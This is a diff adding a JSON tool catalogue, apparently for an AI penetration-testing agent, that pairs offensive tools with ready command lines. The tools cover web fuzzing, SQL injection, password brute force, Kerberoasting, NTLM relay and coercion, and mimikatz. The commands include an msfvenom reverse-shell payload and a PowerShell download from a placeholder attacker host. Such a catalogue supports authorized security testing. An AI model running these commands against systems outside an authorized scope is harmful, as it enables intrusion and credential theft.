@@ -1,0 +1,443 @@
+{
+  "version": 1,
+  "guidance": {
+    "rule": "Pick the smallest tool that fits the observed attack surface. Run '<tool> -h' before unfamiliar use. Use knowledge_search with the tool name for detailed syntax.",
+    "long_running": "For scans likely to exceed the command timeout, run them in background with 'nohup ... > /tmp/tool.log 2>&1 &' and inspect the log with tail/grep."
+  },
+  "categories": [
+    {
+      "id": "web_discovery",
+      "title": "Web discovery, fuzzing, and vulnerability checks",
+      "when": "Use when the target exposes HTTP/HTTPS, APIs, parameters, directories, virtual hosts, known products, or reflected input.",
+      "examples": [
+        "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all",
+        "arjun -u http://TARGET/path -m GET,POST",
+        "nuclei -u http://TARGET -severity low,medium,high,critical"
+      ],
+      "tools": [
+        {
+          "name": "nmap",
+          "commands": ["nmap"],
+          "purpose": "Port scanning, service/version detection, OS hints, and NSE enumeration.",
+          "first_commands": ["nmap -sV -sC -Pn -oN nmap.txt TARGET", "nmap --script vuln -Pn TARGET"],
+          "notes": "Avoid full port scans when the mission already gives a precise URL/port unless there is evidence of more services."
+        },
+        {
+          "name": "fscan",
+          "commands": ["fscan"],
+          "purpose": "Fast intranet host, port, service, and weak credential discovery.",
+          "first_commands": ["fscan -h TARGET_CIDR -o fscan.txt"],
+          "notes": "Use for internal network ranges after pivoting or when multiple private IPs are discovered."
+        },
+        {
+          "name": "ffuf",
+          "commands": ["ffuf"],
+          "purpose": "High-speed directory, file, parameter, API, and virtual-host fuzzing.",
+          "first_commands": ["ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all", "ffuf -u http://IP/ -H 'Host: FUZZ.domain.local' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all"],
+          "notes": "Always establish baseline filters such as -fs, -fw, -fc, or -mc after a short test. Prefer verified in-sandbox wordlist paths from env-info before long fuzzing runs."
+        },
+        {
+          "name": "arjun",
+          "commands": ["arjun"],
+          "purpose": "Discover hidden HTTP parameters and undocumented request fields.",
+          "first_commands": ["arjun -u http://TARGET/path -m GET,POST"],
+          "notes": "Good after finding an endpoint with missing behavior or IDOR-like input."
+        },
+        {
+          "name": "nuclei",
+          "commands": ["nuclei"],
+          "purpose": "Template-based vulnerability, exposure, and misconfiguration detection.",
+          "first_commands": ["nuclei -u http://TARGET -severity medium,high,critical", "nuclei -u http://TARGET -tags cve,exposure,misconfig"],
+          "notes": "Use findings as leads; verify manually before relying on them."
+        },
+        {
+          "name": "sqlmap",
+          "commands": ["sqlmap"],
+          "purpose": "SQL injection detection, exploitation, database enumeration, and dump automation.",
+          "first_commands": ["sqlmap -u 'http://TARGET/item?id=1' --batch --level 2 --risk 1", "sqlmap -r request.txt --batch --current-user --current-db"],
+          "notes": "Use a captured request file when cookies, POST bodies, or custom headers matter."
+        },
+        {
+          "name": "dalfox",
+          "commands": ["dalfox"],
+          "purpose": "Find and validate reflected, stored, and parameter-based XSS.",
+          "first_commands": ["dalfox url 'http://TARGET/search?q=FUZZ'", "dalfox file urls.txt"],
+          "notes": "Confirm exploitable output manually; use with collected URLs and parameters."
+        },
+        {
+          "name": "searchsploit",
+          "commands": ["searchsploit"],
+          "purpose": "Search the local Exploit-DB mirror for known product/version exploits.",
+          "first_commands": ["searchsploit PRODUCT VERSION", "searchsploit -m EXPLOIT_PATH"],
+          "notes": "Use after fingerprinting product and version; prefer reading exploit source before running."
+        }
+      ]
+    },
+    {
+      "id": "credential_and_crypto",
+      "title": "Credentials, password attacks, and token testing",
+      "when": "Use when credentials, hashes, JWTs, login forms, Kerberos users, or password spraying opportunities are discovered.",
+      "examples": [
+        "hydra -L users.txt -P passwords.txt TARGET ssh -V -f",
+        "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "jwt_tool TOKEN -M at"
+      ],
+      "tools": [
+        {
+          "name": "hydra",
+          "commands": ["hydra"],
+          "purpose": "Online authentication brute force and password spraying across many protocols.",
+          "first_commands": ["hydra -L users.txt -P passwords.txt TARGET ssh -V -f", "hydra -l USER -P passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'"],
+          "notes": "Use carefully with small lists and clear failure markers to avoid wasting rounds."
+        },
+        {
+          "name": "hashcat",
+          "commands": ["hashcat"],
+          "purpose": "Offline hash cracking with many hash modes.",
+          "first_commands": ["hashcat --help | grep -i ntlm", "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"],
+          "notes": "Identify the hash mode first; use rockyou or focused wordlists before mask attacks."
+        },
+        {
+          "name": "jwt_tool",
+          "commands": ["jwt_tool"],
+          "purpose": "Decode, tamper, test, and crack JWT tokens.",
+          "first_commands": ["jwt_tool TOKEN", "jwt_tool TOKEN -M at", "jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt"],
+          "notes": "Use after decoding claims and identifying alg/kid/jku/x5u or weak HS secrets."
+        },
+        {
+          "name": "kerbrute",
+          "commands": ["kerbrute"],
+          "purpose": "Kerberos user enumeration and password spraying.",
+          "first_commands": ["kerbrute userenum -d DOMAIN users.txt --dc DC_IP", "kerbrute passwordspray -d DOMAIN users.txt 'Password123' --dc DC_IP"],
+          "notes": "Prefer userenum before spraying; keep lockout risk in mind for authorized ranges."
+        },
+        {
+          "name": "smartbrute",
+          "commands": [],
+          "paths": ["/opt/ad-tools/smartbrute"],
+          "purpose": "Source tree for smart password spraying/bruteforce workflows.",
+          "first_commands": ["cd /opt/ad-tools/smartbrute && ls -la && python3 *.py -h"],
+          "notes": "Source-only helper; inspect README/help before use."
+        }
+      ]
+    },
+    {
+      "id": "ad_enum_and_smb",
+      "title": "Active Directory, Kerberos, LDAP, and SMB enumeration",
+      "when": "Use when a Windows domain, SMB, LDAP, Kerberos, domain credentials, or internal Windows hosts are discovered.",
+      "examples": [
+        "netexec smb TARGET -u USER -p PASS --shares",
+        "smbmap -H TARGET -u USER -p PASS -R",
+        "certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC_IP"
+      ],
+      "tools": [
+        {
+          "name": "netexec",
+          "commands": ["netexec", "nxc"],
+          "purpose": "Enumerate and manage SMB/LDAP/WinRM/MSSQL/SSH services and AD environments.",
+          "first_commands": ["netexec smb TARGET -u USER -p PASS --shares", "netexec ldap DC_IP -u USER -p PASS --users --groups"],
+          "notes": "Use for quick domain/service posture and credential validation."
+        },
+        {
+          "name": "smbmap",
+          "commands": ["smbmap"],
+          "purpose": "Enumerate SMB shares, permissions, and accessible files.",
+          "first_commands": ["smbmap -H TARGET", "smbmap -H TARGET -u USER -p PASS -R"],
+          "notes": "Use before recursive downloads; capture readable shares and interesting files."
+        },
+        {
+          "name": "ldapdomaindump",
+          "commands": ["ldapdomaindump"],
+          "purpose": "Dump LDAP domain users, groups, computers, ACL-related data, and trusts.",
+          "first_commands": ["ldapdomaindump -u DOMAIN\\\\USER -p PASS DC_IP -o ldapdump"],
+          "notes": "Good after obtaining valid domain credentials."
+        },
+        {
+          "name": "powerview",
+          "commands": ["powerview"],
+          "purpose": "Python PowerView-style AD enumeration for users, groups, ACLs, computers, and trusts.",
+          "first_commands": ["powerview -h", "powerview DOMAIN/USER:PASS@DC_IP --help"],
+          "notes": "Use when LDAP/AD object relationships matter."
+        },
+        {
+          "name": "asreproast",
+          "commands": ["asreproast", "impacket-GetNPUsers", "GetNPUsers.py"],
+          "purpose": "Find AS-REP roastable users and request crackable Kerberos material.",
+          "first_commands": ["asreproast DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.hashes", "impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat"],
+          "notes": "Crack returned hashes with hashcat mode 18200."
+        },
+        {
+          "name": "kerberoast",
+          "commands": ["impacket-GetUserSPNs", "GetUserSPNs.py"],
+          "purpose": "Enumerate SPNs and request Kerberoast hashes.",
+          "first_commands": ["impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile spn.hashes"],
+          "notes": "Crack returned hashes with the hashcat mode indicated by the hash format."
+        },
+        {
+          "name": "certipy-ad",
+          "commands": ["certipy-ad", "certipy"],
+          "purpose": "ADCS enumeration and exploitation.",
+          "first_commands": ["certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout", "certipy-ad req -u USER@DOMAIN -p PASS -ca CA_NAME -template TEMPLATE -dc-ip DC_IP"],
+          "notes": "Use for ESC templates, enrollment agents, relay to ADCS, and certificate authentication."
+        },
+        {
+          "name": "SharpHound",
+          "commands": [],
+          "paths": ["/opt/windows-tools/SharpHound"],
+          "purpose": "Windows AD graph collector for BloodHound.",
+          "first_commands": ["ls -la /opt/windows-tools/SharpHound"],
+          "notes": "Windows-native/source tool; transfer/build/use on a Windows host when needed."
+        },
+        {
+          "name": "BloodHound",
+          "commands": ["bloodhound", "bloodhound-python"],
+          "purpose": "AD attack path analysis and/or Python data collector.",
+          "first_commands": ["bloodhound-python -h"],
+          "notes": "Use BloodHound GUI where available; use bloodhound-python for collection from Linux."
+        }
+      ]
+    },
+    {
+      "id": "ad_relay_and_coercion",
+      "title": "NTLM relay, coercion, and ADCS relay chains",
+      "when": "Use when NTLM relay, ADCS web enrollment, IPv6 poisoning, EFSRPC/MS-RPRN coercion, or machine account abuse is in scope.",
+      "examples": [
+        "impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController",
+        "coercer coerce -u USER -p PASS -d DOMAIN -l LISTENER -t TARGET",
+        "mitm6 -d DOMAIN"
+      ],
+      "tools": [
+        {
+          "name": "impacket-ntlmrelayx",
+          "commands": ["impacket-ntlmrelayx", "ntlmrelayx.py"],
+          "purpose": "NTLM relay to SMB/LDAP/HTTP/ADCS targets.",
+          "first_commands": ["impacket-ntlmrelayx -t TARGET --no-smb2support", "impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController"],
+          "notes": "Pair with coercion tools or mitm6; verify SMB signing and relay target viability."
+        },
+        {
+          "name": "mitm6",
+          "commands": ["mitm6"],
+          "purpose": "IPv6 DNS poisoning to capture or relay Windows authentication.",
+          "first_commands": ["mitm6 -d DOMAIN", "mitm6 --domain DOMAIN --host-allowlist HOST"],
+          "notes": "Usually paired with ntlmrelayx; scope carefully."
+        },
+        {
+          "name": "coercer",
+          "commands": ["coercer"],
+          "purpose": "Coerce Windows hosts to authenticate to a listener using multiple RPC methods.",
+          "first_commands": ["coercer scan -u USER -p PASS -d DOMAIN -t TARGET", "coercer coerce -u USER -p PASS -d DOMAIN -l LISTENER -t TARGET"],
+          "notes": "Use to trigger relay paths after setting up ntlmrelayx."
+        },
+        {
+          "name": "PetitPotam",
+          "commands": ["petitpotam"],
+          "paths": ["/opt/ad-tools/PetitPotam"],
+          "purpose": "EFSRPC coercion for NTLM relay chains.",
+          "first_commands": ["petitpotam LISTENER TARGET"],
+          "notes": "Wrapper enters /opt/ad-tools/PetitPotam and runs PetitPotam.py."
+        },
+        {
+          "name": "PrinterBug",
+          "commands": ["printerbug"],
+          "paths": ["/opt/ad-tools/krbrelayx/printerbug.py"],
+          "purpose": "MS-RPRN printer bug coercion.",
+          "first_commands": ["printerbug DOMAIN/USER:PASS@TARGET LISTENER"],
+          "notes": "Wrapper runs the krbrelayx printerbug script."
+        },
+        {
+          "name": "krbrelayx",
+          "commands": ["krbrelayx"],
+          "paths": ["/opt/ad-tools/krbrelayx"],
+          "purpose": "Kerberos/LDAP relay helper scripts.",
+          "first_commands": ["krbrelayx -h"],
+          "notes": "Inspect the source tree for additional helper scripts."
+        },
+        {
+          "name": "DFSCoerce",
+          "commands": [],
+          "paths": ["/opt/ad-tools/DFSCoerce"],
+          "purpose": "DFS namespace coercion script/source tree.",
+          "first_commands": ["cd /opt/ad-tools/DFSCoerce && ls -la && python3 *.py -h"],
+          "notes": "Source-only helper; run from its directory."
+        },
+        {
+          "name": "ShadowCoerce",
+          "commands": [],
+          "paths": ["/opt/ad-tools/ShadowCoerce"],
+          "purpose": "Shadow copy related coercion script/source tree.",
+          "first_commands": ["cd /opt/ad-tools/ShadowCoerce && ls -la && python3 *.py -h"],
+          "notes": "Source-only helper; run from its directory."
+        },
+        {
+          "name": "PrivExchange",
+          "commands": ["privexchange"],
+          "paths": ["/opt/ad-tools/PrivExchange"],
+          "purpose": "Exchange-related forced authentication and relay helper.",
+          "first_commands": ["privexchange -h"],
+          "notes": "Wrapper runs privexchange.py from /opt/ad-tools/PrivExchange."
+        }
+      ]
+    },
+    {
+      "id": "windows_transfer_tools",
+      "title": "Windows-native tools and transferable sources",
+      "when": "Use when Windows execution, credential extraction, DPAPI, ticket handling, ADCS Windows tooling, or BloodHound collection is needed.",
+      "examples": [
+        "ls -la /opt/windows-tools",
+        "python3 -m http.server 9002 -d /opt/windows-tools",
+        "powershell -c \"iwr http://ATTACKER:9002/tool.exe -OutFile C:\\\\Windows\\\\Temp\\\\tool.exe\""
+      ],
+      "tools": [
+        {
+          "name": "mimikatz",
+          "commands": [],
+          "paths": ["/opt/windows-tools/mimikatz"],
+          "purpose": "Windows credential extraction and ticket operations.",
+          "first_commands": ["ls -la /opt/windows-tools/mimikatz"],
+          "notes": "Windows-native binary; transfer only after obtaining authorized Windows execution."
+        },
+        {
+          "name": "Rubeus",
+          "commands": [],
+          "paths": ["/opt/windows-tools/Rubeus"],
+          "purpose": "Kerberos TGT/TGS, Kerberoast, S4U, PTT, and ticket operations on Windows.",
+          "first_commands": ["ls -la /opt/windows-tools/Rubeus"],
+          "notes": "Windows-native/source tool; build or transfer where appropriate."
+        },
+        {
+          "name": "SharpDPAPI",
+          "commands": [],
+          "paths": ["/opt/windows-tools/SharpDPAPI"],
+          "purpose": "DPAPI credential extraction and analysis on Windows.",
+          "first_commands": ["ls -la /opt/windows-tools/SharpDPAPI"],
+          "notes": "Windows-native/source tool."
+        },
+        {
+          "name": "Certify",
+          "commands": [],
+          "paths": ["/opt/windows-tools/Certify"],
+          "purpose": "Windows ADCS enumeration and exploitation.",
+          "first_commands": ["ls -la /opt/windows-tools/Certify"],
+          "notes": "Use Certipy from Linux first; use Certify when Windows execution is available."
+        },
+        {
+          "name": "AdFind",
+          "commands": [],
+          "paths": ["/opt/windows-tools/adfind"],
+          "purpose": "Windows AD LDAP query and ACL enumeration utility.",
+          "first_commands": ["ls -la /opt/windows-tools/adfind"],
+          "notes": "Likely replacement for requested dFind; Windows-native."
+        },
+        {
+          "name": "StreamDivert",
+          "commands": [],
+          "paths": ["/opt/windows-tools/StreamDivert"],
+          "purpose": "Windows traffic redirection/diversion helper.",
+          "first_commands": ["ls -la /opt/windows-tools/StreamDivert"],
+          "notes": "Windows-native/source tool; inspect README before use."
+        }
+      ]
+    },
+    {
+      "id": "cloud_container_k8s",
+      "title": "Cloud, container, dependency, and Kubernetes auditing",
+      "when": "Use when cloud credentials, container images, Kubernetes endpoints, manifests, or filesystem dependency risk are discovered.",
+      "examples": [
+        "trivy fs .",
+        "trivy image IMAGE",
+        "prowler aws --profile PROFILE",
+        "kube-hunter --remote HOST"
+      ],
+      "tools": [
+        {
+          "name": "prowler",
+          "commands": ["prowler"],
+          "purpose": "Cloud security auditing for AWS, Azure, GCP, and Kubernetes.",
+          "first_commands": ["prowler -h", "prowler aws --profile PROFILE"],
+          "notes": "Requires valid cloud credentials or environment configuration."
+        },
+        {
+          "name": "trivy",
+          "commands": ["trivy"],
+          "purpose": "Scan container images, filesystems, IaC, and dependencies for vulnerabilities and secrets.",
+          "first_commands": ["trivy fs .", "trivy image IMAGE", "trivy config ."],
+          "notes": "Use after finding source code, Dockerfiles, manifests, or image names."
+        },
+        {
+          "name": "kube-hunter",
+          "commands": ["kube-hunter"],
+          "purpose": "Kubernetes cluster exposure and weakness discovery.",
+          "first_commands": ["kube-hunter --remote HOST", "kube-hunter --cidr CIDR"],
+          "notes": "Use only when Kubernetes targets are in authorized scope."
+        }
+      ]
+    },
+    {
+      "id": "network_analysis",
+      "title": "Packet capture and protocol analysis",
+      "when": "Use when traffic evidence, protocol debugging, credentials in transit, or pcap analysis matters.",
+      "examples": [
+        "tshark -i any -a duration:30 -w capture.pcap",
+        "tshark -r capture.pcap -Y 'http || kerberos || ldap || smb2'"
+      ],
+      "tools": [
+        {
+          "name": "tshark",
+          "commands": ["tshark"],
+          "purpose": "CLI packet capture and protocol analysis.",
+          "first_commands": ["tshark -i any -a duration:30 -w capture.pcap", "tshark -r capture.pcap -Y 'http || dns || kerberos || ldap || smb2'"],
+          "notes": "Prefer tshark in containers; Wireshark GUI may not be practical."
+        },
+        {
+          "name": "wireshark",
+          "commands": ["wireshark"],
+          "purpose": "GUI packet analysis when display forwarding is available.",
+          "first_commands": ["wireshark -h"],
+          "notes": "Usually use tshark instead inside the sandbox."
+        }
+      ]
+    },
+    {
+      "id": "exploit_helpers",
+      "title": "Exploit frameworks, payloads, deserialization, and local privesc enumeration",
+      "when": "Use after confirming a vulnerable service, exploit module, deserialization sink, or local shell.",
+      "examples": [
+        "msfconsole -q -x 'search type:exploit PRODUCT; exit'",
+        "ysoserial CommonsCollections1 'id'",
+        "linpeas"
+      ],
+      "tools": [
+        {
+          "name": "Metasploit Framework",
+          "commands": ["msfconsole", "msfvenom"],
+          "purpose": "Modular exploit, payload, scanner, and post-exploitation framework.",
+          "first_commands": ["msfconsole -q -x 'search type:exploit PRODUCT; exit'", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf"],
+          "notes": "Use non-interactive -x scripts because sandbox commands are non-interactive."
+        },
+        {
+          "name": "ysoserial",
+          "commands": ["ysoserial"],
+          "paths": ["/opt/exploit-tools/ysoserial-all.jar"],
+          "purpose": "Generate Java deserialization payloads.",
+          "first_commands": ["ysoserial CommonsCollections1 'id' | base64 -w0", "ysoserial --help"],
+          "notes": "Understand whether output execution is local payload generation or remote target execution."
+        },
+        {
+          "name": "linpeas",
+          "commands": ["linpeas"],
+          "purpose": "Linux local privilege escalation enumeration script.",
+          "first_commands": ["linpeas | tee linpeas.txt"],
+          "notes": "Run on a compromised Linux target, not just in the sandbox, unless analyzing local sandbox only."
+        },
+        {
+          "name": "Darksteel",
+          "commands": [],
+          "paths": ["/opt/ad-tools/Darksteel"],
+          "purpose": "Domain automation information gathering and exploitation source tree.",
+          "first_commands": ["cd /opt/ad-tools/Darksteel && ls -la && python3 *.py -h"],
+          "notes": "Inspect README/help before use; source-only wrapper may vary by upstream."
+        }
+      ]
+    }
+  ]
+}
